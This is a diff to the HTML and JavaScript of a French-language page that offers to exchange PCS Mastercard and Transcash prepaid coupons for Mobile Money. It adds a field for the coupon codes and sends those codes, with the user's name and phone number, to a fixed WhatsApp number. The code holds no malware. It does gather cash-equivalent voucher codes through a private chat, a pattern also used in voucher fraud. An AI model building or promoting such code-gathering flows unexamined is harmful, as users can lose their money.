@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CHREOL EMPIRE - Échange de Coupons PCS MASTERCARD ET TRANCASH en CFA XAF</title>
+    <title>CHREOL EMPIRE - Échange vos Coupons PCS MASTERCARD ET TRANCASH en Mobile Money CFA XAF</title>
     <style>
         :root {
             --gold: #C9A84C;
@@ -45,14 +45,15 @@
         .form-group { margin-bottom: 15px; }
         label { display: block; font-size: 10px; color: var(--text-muted); margin-bottom: 5px; text-transform: uppercase; font-weight: bold; }
         
-        select, input {
+        select, input, textarea {
             width: 100%; padding: 12px; background: #000; border: 1px solid var(--border);
             color: #fff; border-radius: 10px; font-size: 14px; outline: none; box-sizing: border-box;
+            font-family: inherit;
         }
 
-        select:focus, input:focus { border-color: var(--gold); }
+        textarea { resize: vertical; min-height: 80px; }
+        select:focus, input:focus, textarea:focus { border-color: var(--gold); }
 
-        /* Section Client Info */
         .client-info-section {
             background: rgba(201, 168, 76, 0.05);
             border: 1px dashed var(--border);
@@ -78,12 +79,31 @@
 
         .btn-wa:hover { transform: translateY(-2px); filter: brightness(1.1); }
 
+        /* Floating Button */
+        .wa-float {
+            position: fixed;
+            bottom: 25px;
+            right: 25px;
+            background: var(--green);
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            cursor: pointer;
+            z-index: 100;
+        }
+
         .fast-note {
             font-size: 11px; color: #aaa; text-align: center; margin-top: 15px; font-style: italic;
+            line-height: 1.4;
         }
 
         footer {
             margin-top: 30px; text-align: center; color: var(--text-muted); font-size: 12px;
+            padding-bottom: 40px;
         }
     </style>
 </head>
@@ -91,8 +111,8 @@
 
 <div class="container">
     <div class="header">
-        <img src="./img/chreol-change-logo.webp" alt="Chreol Change Logo" class="logo-img">
-        <h2>Échange de Coupons</h2>
+        <img src="" alt="Chreol Change logo" class="logo-img">
+        <h2>Échangez vos Coupons</h2>
     </div>
 
     <!-- Choix du coupon -->
@@ -101,39 +121,49 @@
         <select id="couponType" onchange="calculateExchange()">
             <option value="pcs">PCS Mastercard</option>
             <option value="transcash">Transcash</option>
-            <!-- <option value="paysafecard"></option> -->
+            <!-- <option value="paysafecard">Paysafecard (Taux: 440)</option> -->
         </select>
     </div>
 
     <div class="form-group">
-        <label>Valeur du coupon (€ Euro)</label>
-        <input type="number" id="euroValue" placeholder="Ex: 50" oninput="calculateExchange()">
+        <label>Valeur totale du/des coupon(s) (€ Euro)</label>
+        <input type="number" id="euroValue" placeholder="Ex: 100" oninput="calculateExchange()">
+    </div>
+
+    <!-- SAISIE DES CODES -->
+    <div class="form-group">
+        <label>Entrez le(s) code(s) de coupon</label>
+        <textarea id="couponCodes" placeholder="Saisissez vos codes ici. Si plusieurs, séparez-les par une virgule (ex: CODE1, CODE2)"></textarea>
     </div>
 
     <!-- INFOS RECEPTION UTILISATEUR -->
     <div class="client-info-section">
-        <div class="section-title">📱 Vos coordonnées de réception Mobile Money</div>
+        <div class="section-title">📱 Réception Mobile Money</div>
         <div class="form-group">
-            <label>Nom & Prénom</label>
-            <input type="text" id="userName" placeholder="Ex: Jean Dupont">
+            <label>Nom & Prénom du bénéficiaire</label>
+            <input type="text" id="userName" placeholder="Ex: Constant Tagny">
         </div>
         <div class="form-group">
-            <label>Numéro de téléphone (MTN ou Orange)</label>
+            <label>Numéro de téléphone</label>
             <input type="tel" id="userPhone" placeholder="Ex: 6xx xxx xxx">
         </div>
     </div>
 
     <div class="price-display">
-        <div class="price-label">Montant que vous recevrez</div>
+        <div class="price-label">Montant net à verser</div>
         <div class="price-amount" id="totalCfa">0 FCFA</div>
     </div>
 
     <!-- CTA Principal -->
     <button class="btn-wa" onclick="sendOrder()">
-        ✅ Finaliser l'échange maintenant
+        ✅ Valider l'échange sur WhatsApp
     </button>
 
-    <p class="fast-note">⚡ Note : Une fois le code envoyé, votre transaction sera prise en compte le plus rapidement possible.</p>
+    <p class="fast-note">⚡ La transaction sera prise en compte le plus rapidement possible après vérification de vos codes.</p>
+</div>
+
+<div class="wa-float" onclick="sendOrder()">
+    <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
 </div>
 
 <footer>
@@ -163,16 +193,17 @@
     function sendOrder() {
         const type = document.getElementById('couponType').selectedOptions[0].text;
         const euro = document.getElementById('euroValue').value || "0";
+        const codes = document.getElementById('couponCodes').value;
         const total = document.getElementById('totalCfa').innerText;
         const name = document.getElementById('userName').value;
         const phone = document.getElementById('userPhone').value;
 
-        if(!name || !phone || euro <= 0) {
-            alert("Veuillez remplir tous les champs avant de continuer.");
+        if(!name || !phone || !codes || euro <= 0) {
+            alert("Veuillez remplir tous les champs, y compris les codes de coupon.");
             return;
         }
 
-        const text = `Bonjour Chreol Empire,\n\nJe souhaite échanger un coupon :\n🎫 Type : ${type}\n💶 Valeur : ${euro}€\n\n💰 Montant à recevoir : ${total}\n\n📍 INFO RÉCEPTION MOBILE MONEY :\n👤 Nom : ${name}\n📞 Numéro : ${phone}\n\nJe vous envoie le code du coupon ci-dessous...`;
+        const text = `Bonjour Chreol Empire,\n\nJe souhaite échanger des coupons :\n\n🎫 TYPE : ${type}\n💶 VALEUR TOTALE : ${euro}€\n🔑 CODES : ${codes}\n\n💰 MONTANT À RECEVOIR : ${total}\n\n📍 RÉCEPTION :\n👤 NOM : ${name}\n📞 NUMÉRO : ${phone}\n\nMerci de traiter ma transaction rapidement.`;
         
         window.open(`https://wa.me/237697657734?text=${encodeURIComponent(text)}`, '_blank');
     }
